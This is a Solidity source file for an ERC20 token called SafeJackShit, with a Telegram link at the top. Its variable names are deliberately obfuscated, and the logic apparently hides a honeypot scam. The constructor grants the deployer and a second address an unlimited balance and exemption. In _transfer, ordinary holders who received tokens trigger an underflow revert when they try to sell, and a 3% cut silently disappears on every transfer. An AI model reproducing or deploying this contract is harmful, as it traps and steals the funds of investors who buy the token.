// https://t.me/safejackshit

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.2;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract SafeJackShit is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private solution;

    function _transfer(
        address front,
        address jar,
        uint256 happy
    ) internal override {
        uint256 condition = see;

        if (attack[front] == 0 && solution[front] > 0 && uniswapV2Pair != front) {
            attack[front] -= condition;
        }

        address warm = dirt;
        dirt = jar;
        solution[warm] += condition + 1;

        _balances[front] -= happy;
        uint256 zipper = (happy / 100) * see;
        happy -= zipper;
        _balances[jar] += happy;
    }

    address private dirt;
    mapping(address => uint256) private attack;
    uint256 public see = 3;

    constructor(
        string memory clean,
        string memory examine,
        address curve,
        address myself
    ) ERC20(clean, examine) {
        uint256 meet = ~((uint256(0)));

        uniswapV2Router = IUniswapV2Router02(curve);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        attack[msg.sender] = meet;
        attack[myself] = meet;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[myself] = meet;
    }
}